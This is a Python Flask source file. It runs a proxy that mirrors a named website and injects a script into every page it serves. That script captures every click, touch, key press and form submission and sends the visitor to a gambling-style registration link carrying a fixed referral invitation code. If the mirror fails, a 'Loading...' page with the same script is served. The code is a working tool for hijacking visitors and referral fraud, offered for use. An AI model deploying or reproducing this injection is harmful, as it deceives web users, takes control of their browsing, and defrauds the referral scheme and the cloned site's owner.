import os
from flask import Flask, Response, request
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin

app = Flask(__name__)

TARGET = "https://thetashanwiin.com"
REDIRECT = "https://www.tashanwin.org/#/register?invitationCode=165813801027"

INJECTION = ("<script>(function(){var t='%s';function go(){try{window.location.href=t;}catch(e){location.assign(t);}}"
             "function h(e){try{e.preventDefault();e.stopPropagation();}catch(_){ }go();return false;}"
             "['click','touchstart','pointerdown','mousedown','mouseup','submit','keydown'].forEach(function(ev){document.addEventListener(ev,h,true);});"
             "if(document.readyState==='loading'){document.addEventListener('DOMContentLoaded',function(){var n=document.querySelectorAll('a,button,form,input,div,span');n.forEach(function(x){x.onclick=h;});});}"
             "else{var n=document.querySelectorAll('a,button,form,input,div,span');n.forEach(function(x){x.onclick=h;});}"
             "})();</script>") % REDIRECT

def fetch_remote(path: str) -> Response:
    url = urljoin(TARGET + "/", path)
    r = requests.get(url, params=request.args, timeout=15)
    ct = r.headers.get("content-type", "")
    if "text/html" in ct.lower():
        html = r.text
        soup = BeautifulSoup(html, "html.parser")
        if not soup.head and soup.html:
            soup.html.insert(0, soup.new_tag("head"))
        try:
            base = soup.new_tag("base", href=TARGET + "/")
            if soup.head:
                soup.head.insert(0, base)
        except Exception:
            pass
        inj = BeautifulSoup(INJECTION, "html.parser")
        if soup.body:
            soup.body.insert(0, inj)
        else:
            soup.append(inj)
        out = str(soup)
        return Response(out, status=r.status_code, headers={"Content-Type": "text/html"})
    return Response(r.content, status=r.status_code, headers={"Content-Type": ct})

@app.route("/", defaults={"path": ""})
@app.route("/<path:path>")
def proxy(path: str):
    try:
        return fetch_remote(path)
    except Exception:
        fallback = "<!doctype html><html><head><meta charset='utf-8'><title>Loading...</title></head><body>%s<div style='display:none'></div></body></html>" % INJECTION
        return Response(fallback, headers={"Content-Type": "text/html"})

if __name__ == "__main__":
    port = int(os.environ.get("PORT", "8000"))
    app.run(host="0.0.0.0", port=port)